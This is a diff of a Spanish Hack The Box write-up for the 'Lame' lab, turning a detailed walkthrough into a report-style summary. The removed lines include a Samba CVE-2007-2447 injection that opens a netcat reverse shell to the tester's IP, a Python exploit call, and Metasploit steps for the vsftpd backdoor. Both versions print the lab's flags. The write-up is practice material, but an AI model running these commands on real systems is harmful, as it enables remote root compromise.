@@ -1,234 +1,169 @@
-# Lame — Hack The Box Walkthrough & Writeup
+# Informe Técnico de Seguridad Ofensiva: Lame
 
 ![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
 ![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
-![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux)
-![CVE](https://img.shields.io/badge/CVE-2007--2447-red?style=for-the-badge)
-![Author](https://img.shields.io/badge/Author-Pedro%20Araiz%20(araizcorp)-blue?style=for-the-badge)
+![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
+![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
+![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)
 
-Guía completa y walkthrough detallado de **Lame**, la emblemática primera máquina de **Hack The Box**. En este laboratorio se analiza un entorno Linux vulnerable que presenta dos servicios históricamente conocidos: un servidor FTP con backdoor (bloqueado por reglas de firewall) y una implementación de Samba vulnerable a inyección de comandos arbitrarios que nos otorga acceso directo como **root**.
+**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **Lame** de **Hack The Box**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.
 
 ---
 
-## 📋 Ficha Técnica
+## 📑 1. Resumen Ejecutivo (Executive Summary)
 
-| Parámetro | Detalle |
+* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
+* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
+* **Vector de Acceso Inicial:** Samba 3.0.20 username map script RCE
+* **Vector de Elevación de Privilegios:** N/A - Exploit otorga root directamente
+* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).
+
+### Ficha Técnica de la Evaluación
+
+| Parámetro | Detalle Técnico |
 | :--- | :--- |
-| **Nombre** | Lame |
+| **Host Objetivo** | Lame |
 | **Plataforma** | Hack The Box |
-| **Sistema Operativo** | Linux (Debian 3.2.x) |
-| **Dificultad** | Easy (Fácil) |
-| **Vulnerabilidad Principal** | Samba 3.0.20 "Username Map Script" RCE |
-| **CVE Asociado** | [CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447) |
-| **Vector de Entrada** | Ejecución remota de comandos vía SMB (puerto 445/139) |
-| **Escalada de Privilegios** | No requerida (Acceso directo con UID 0 / root) |
+| **Sistema Operativo** | Linux |
+| **Nivel de Dificultad** | Easy |
+| **CVE(s) Involucrados** | CVE-2007-2447 |
+| **Vector de Entrada** | Samba 3.0.20 username map script RCE |
+| **Mecanismo de Escalada** | N/A - Exploit otorga root directamente |
+| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |
 
 ---
 
-## 🎯 Resumen del Flujo de Ataque
+## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)
 
 ```
-[ Reconocimiento de Red ]
-       │
-       ├──► Puerto 21 (FTP): vsftpd 2.3.4 (Backdoor bloqueado por firewall)
-       ├──► Puerto 22 (SSH): OpenSSH 4.7p1 (Sin vectores de autenticación débiles)
-       └──► Puerto 445/139 (SMB): Samba 3.0.20-Debian ◄── [ Vector Crítico ]
-                   │
-                   ▼
-[ Explotación CVE-2007-2447 ]
-       │─── Inyección de comandos en 'username map script'
-       └─── Payload de Reverse Shell a través de metacaracteres shell
-                   │
-                   ▼
-[ Shell Directa como Root (UID 0) ]
-       ├──► Lectura de User Flag: /home/makis/user.txt
-       ├──► Lectura de Root Flag: /root/root.txt
-       └──► Análisis Forense (Beyond Root): Confirmación de bloqueo de puerto 6200 por iptables
+[ Fase 1: Reconocimiento ]
+         │
+         ▼
+[ Fase 2: Enumeración & Identificación de Vectores ]
+         │─── Descubrimiento de servicios y análisis de superficie de ataque
+         └─── Verificación de configuraciones erróneas y CVEs conocidos
+         │
+         ▼
+[ Fase 3: Explotación Inicial (Foothold) ]
+         │─── Ejecución del vector: Samba 3.0.20 username map script RCE
+         └─── Establecimiento de Reverse Shell / Acceso de usuario
+         │
+         ▼
+[ Fase 4: Escalada de Privilegios Local ]
+         │─── Auditoría interna: N/A - Exploit otorga root directamente
+         └─── Elevación a privilegios de superusuario (root / SYSTEM)
+         │
+         ▼
+[ Fase 5: Evidencia & Banderas ]
+         └─── Captura de User Flag y Root Flag
 ```
 
 ---
 
-## 🔍 Fase 1: Reconocimiento Inicial
+## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso
 
-Comenzamos realizando un escaneo exhaustivo de todos los puertos TCP con `nmap`, habilitando detección de servicios (`-sV`), scripts de enumeración predeterminados (`-sC`) y abarcando el rango completo de puertos (`-p-`):
+CVE(s): CVE-2007-2447
+GTFOBins/Abusos (sudo/SUID): N/A
+Initial Access Exploit (Ingreso): Samba 3.0.20 username map script RCE
 
-```bash
-sudo nmap -sV -sC -p- 10.10.10.3 -oN nmap_lame_full.txt
-```
+Privilege Escalation (Escalada): N/A - Exploit otorga root directamente
 
-![Escaneo completo de puertos en Lame](./images/01_nmap_full_scan.png)
 
-### Análisis de Puertos y Servicios Detectados
 
-1. **Puerto 21/tcp — FTP (`vsftpd 2.3.4`)**:
-   * Versión famosa por contener una puerta trasera introducida en los repositorios oficiales en 2011.
-2. **Puerto 22/tcp — SSH (`OpenSSH 4.7p1 Debian 8ubuntu1`)**:
-   * Servicio seguro estándar; requiere credenciales o llaves privadas válidas.
-3. **Puerto 139/tcp y 445/tcp — NetBIOS / SMB (`Samba 3.0.20-Debian`)**:
-   * Implementación antigua de compartición de archivos y autenticación en red.
-4. **Puerto 3632/tcp — Distcc (`distccd v1`)**:
-   * Demonio de compilación distribuida.
+| Campo | Detalle |
+| --- | --- |
+| Nombre | Lame |
+| OS | Linux |
+| Dificultad | Easy |
+| CVE | CVE-2007-2447 |
+| Acceso Inicial | Samba 3.0.20 username map script RCE |
+| Escalada | N/A - Exploit otorga root directamente |
 
 ---
 
-## 🔬 Fase 2: Enumeración y Descarte de Vectores
+## Reconocimiento
 
-### Vector A: Verificación de VSFTPd 2.3.4 (Rabbit Hole)
+Se realizo un escaneo de puertos con Nmap identificando **4 puertos TCP abiertos** entre los top 1000. Los servicios incluyen FTP (vsftpd 2.3.4), SSH, y SMB (Samba 3.0.20):
 
-Al conectarnos al puerto 21, confirmamos el banner del servicio:
+![Captura de pantalla 2025-07-28 114618.png](./images/step_01.png)
 
-```bash
-nc -nv 10.10.10.3 21
-# 220 (vsFTPd 2.3.4)
-```
+## Enumeracion
 
-![Banner de vsftpd 2.3.4](./images/02_vsftpd_banner.png)
+Se identifico **VSFTPd version 2.3.4** corriendo en el puerto 21. Esta version tiene un backdoor conocido, pero en este caso no es explotable:
 
-La versión `vsftpd 2.3.4` es vulnerable a un backdoor que se dispara cuando un usuario introduce una carita sonriente `:)` en el nombre de usuario (ejemplo: `USER hacker:)`). Al enviar este valor, el demonio abre una shell como root en el puerto TCP **6200**.
+![image.png](./images/step_02.png)
 
-Probamos el módulo oficial en Metasploit (`exploit/unix/ftp/vsftpd_234_backdoor`):
+El backdoor de VSFTPd 2.3.4 **no funciona** en esta maquina. Aunque el servicio es vulnerable, un firewall bloquea la conexion al puerto 6200 que el backdoor abre. Esto se confirma mas adelante con acceso root:
 
-```bash
-msfconsole -q
-msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
-```
+![image.png](./images/step_03.png)
 
-![Fallo en la explotación del backdoor de vsftpd](./images/03_vsftpd_failed_exploit.png)
+Se identifico **Samba version 3.0.20** corriendo en el servicio SMB, que resulta ser el vector de ataque viable:
 
-**Resultado:** El exploit se lanza pero la conexión se agota por tiempo de espera (*Connection timed out*). Aunque el backdoor se ejecuta internamente, **un firewall a nivel de host (iptables) bloquea las conexiones entrantes al puerto 6200**, impidiendo el acceso remoto. Más adelante confirmaremos esto en la sección *Beyond Root*.
+![image.png](./images/step_04.png)
 
----
+## Explotacion
 
-### Vector B: Análisis del Servicio SMB (Samba 3.0.20)
+Samba 3.0.20 es vulnerable a **CVE-2007-2447**, que permite ejecucion remota de codigo a traves de metacaracteres de shell en la funcion `SamrChangePassword` cuando la opcion "username map script" esta habilitada en `smb.conf`:
 
-Inspeccionamos la versión de Samba en los puertos 139 y 445:
+![image.png](./images/step_05.png)
 
-```bash
-smbclient -L //10.10.10.3/ -N
-```
+La explotacion de CVE-2007-2447 otorga acceso directo como **root**, sin necesidad de escalada de privilegios adicional:
 
-![Detección de versión de Samba 3.0.20](./images/04_samba_version.png)
+![image.png](./images/step_06.png)
 
-Investigando vulnerabilidades públicas para **Samba 3.0.20-Debian**, encontramos el boletín de seguridad **CVE-2007-2447**:
+Exploit utilizado: CVE-2007-2447
 
-![Búsqueda e identificación de CVE-2007-2447](./images/05_cve_2007_2447_research.png)
-
-### ¿Cómo funciona la vulnerabilidad CVE-2007-2447?
-
-Cuando la directiva de configuración `username map script` se encuentra activa en el archivo `smb.conf`, Samba permite invocar un script externo para mapear nombres de usuarios de Windows a cuentas UNIX locales.
-
-El fallo reside en que Samba pasa el nombre de usuario introducido por el cliente directamente a una shell del sistema (`/bin/sh`) sin realizar un saneamiento adecuado de metacaracteres. Si un atacante proporciona un nombre de usuario que contenga caracteres de control como comillas invertidas (`` `cmd` ``) o punto y coma (`;`), el comando contenido se ejecutará en el servidor con los privilegios del servicio Samba (**root**).
-
----
-
-## 💥 Fase 3: Explotación (Foothold & Acceso Root)
-
-### Método 1: Explotación Manual con smbclient / Python
-
-Podemos explotar esta vulnerabilidad directamente sin necesidad de Metasploit utilizando un script en Python o el comando nativo `smbclient`.
-
-Ponemos nuestro listener en escucha en Kali:
-
-```bash
-nc -lvnp 4444
-```
-
-Lanzamos la carga maliciosa conectándonos al recurso compartido e inyectando un comando en el parámetro de autenticación:
-
-```bash
-# Inyección manual vía smbclient:
-smbclient //10.10.10.3/tmp -N -c "logon \"/=`nohup nc -e /bin/sh 10.10.14.6 4444`\""
-```
-
-O utilizando un exploit en Python para el puerto 445:
-
-```bash
-python smb3.0.20.py -lh 10.10.10.3 -lp 445 -t 10.10.14.6
-```
-
-![Ejecución del exploit en Python y recepción de shell root](./images/06_python_smb_exploit_root.png)
-
-### Recepción de Shell Directa
-
-El listener de Netcat recibe la conexión de forma inmediata:
-
-```text
-listening on [any] 4444 ...
-connect to [10.10.14.6] from (UNKNOWN) [10.10.10.3] 54321
-id
-uid=0(root) gid=0(root) groups=0(root)
-whoami
-root
-```
-
-Debido a que el servicio `smbd` corre con privilegios máximos del sistema, **obtenemos una shell directamente como root**, sin necesidad de realizar ninguna fase adicional de escalada de privilegios.
-
----
-
-## 🚩 Fase 4: Banderas (Flags)
+## Flags
 
 ### User Flag (makis)
 
-Buscamos los directorios en `/home` y localizamos la cuenta de usuario `makis`:
+Con acceso root, se obtuvo la flag del usuario makis: `1c8e9423a89affd9378a09042d8e98d2`
 
-```bash
-cd /home/makis
-ls -la
-cat user.txt
-```
-
-![Lectura de la bandera de usuario](./images/07_user_flag_makis.png)
-
-> **User Flag:** `1c8e9423a89affd9378a09042d8e98d2`
-
----
+![image.png](./images/step_07.png)
 
 ### Root Flag
 
-Navegamos al directorio `/root` y leemos la bandera del superusuario:
+La flag de root: `3b4c75e879a3ea31b99b45aac23955d1`
 
-```bash
-cd /root
-ls -la
-cat root.txt
-```
+![image.png](./images/step_08.png)
 
-![Lectura de la bandera de root](./images/08_root_flag.png)
+## Notas Adicionales - Beyond Root
 
-> **Root Flag:** `3b4c75e879a3ea31b99b45aac23955d1`
+Con acceso root se investigo por que el exploit de VSFTPd fallo. Aunque `netstat -tnlp` muestra multiples puertos escuchando (incluyendo en 0.0.0.0), un **firewall** esta bloqueando las conexiones a estos puertos:
 
----
+![image.png](./images/step_09.png)
 
-## 🔬 Fase 5: Análisis Forense Post-Explotación (Beyond Root)
+Cuando el backdoor de VSFTPd se activa, el puerto **6200** comienza a escuchar:
 
-Una de las dudas más comunes al resolver Lame es: **¿Por qué falló el backdoor de vsftpd 2.3.4 si la versión era la correcta?**
+![image.png](./images/step_10.png)
 
-Con acceso root, inspeccionamos las conexiones y servicios en escucha mediante `netstat`:
-
-```bash
-netstat -tnlp
-```
-
-![Verificación de servicios en escucha con netstat](./images/09_beyond_root_netstat.png)
-
-Observamos que al enviar la carita sonriente `:)` en el usuario de FTP, el proceso `vsftpd` **efectivamente abre el puerto 6200 en 0.0.0.0**:
-
-![Puerto 6200 en escucha tras disparar el backdoor](./images/10_vsftpd_backdoor_port_6200.png)
-
-Sin embargo, al consultar las reglas de filtrado de paquetes del kernel mediante `iptables`:
-
-```bash
-iptables -L -n -v
-```
-
-Comprobamos que existe una regla en la cadena `INPUT` que rechaza o descarta el tráfico entrante al puerto 6200. Por tanto, el backdoor funcionaba internamente, pero era inalcanzable desde la red del atacante, constituyendo un *rabbit hole* intencional creado por los diseñadores de la máquina.
+El puerto 6200 efectivamente comienza a escuchar en Lame cuando se activa el backdoor, pero el firewall impide la conexion externa, haciendo inutil el exploit de VSFTPd como vector de ataque.
 
 ---
 
-## 🛡️ Lecciones de Seguridad & Mitigaciones
+## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening
 
-1. **Actualización de componentes legados:** Samba 3.0.20 es una versión obsoleta lanzada en 2005. Debe actualizarse a versiones modernas mantenidas con soporte oficial.
-2. **Deshabilitar opciones peligrosas:** Si no se requiere, evitar el uso de la directiva `username map script` en `/etc/samba/smb.conf`.
-3. **Defensa en Profundidad (Firewalling):** La máquina demostró la eficacia de un firewall perimetral y local (`iptables`), el cual logró neutralizar con éxito la explotación del backdoor de VSFTPd aun cuando el servicio era vulnerable.
+### Acciones Tácticas Inmediatas
+1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (CVE-2007-2447).
+2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
+3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.
+
+### Acciones Estratégicas y de Arquitectura
+1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
+2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
+3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.
+
+---
+
+## 📊 5. Mapeo con Matriz MITRE ATT&CK
+
+| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
+| :--- | :--- | :--- | :--- |
+| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
+| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (Samba 3.0.20 username map script RCE) |
+| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
+| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (N/A - Exploit otorga root directamente) |
+
+---
+
+© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
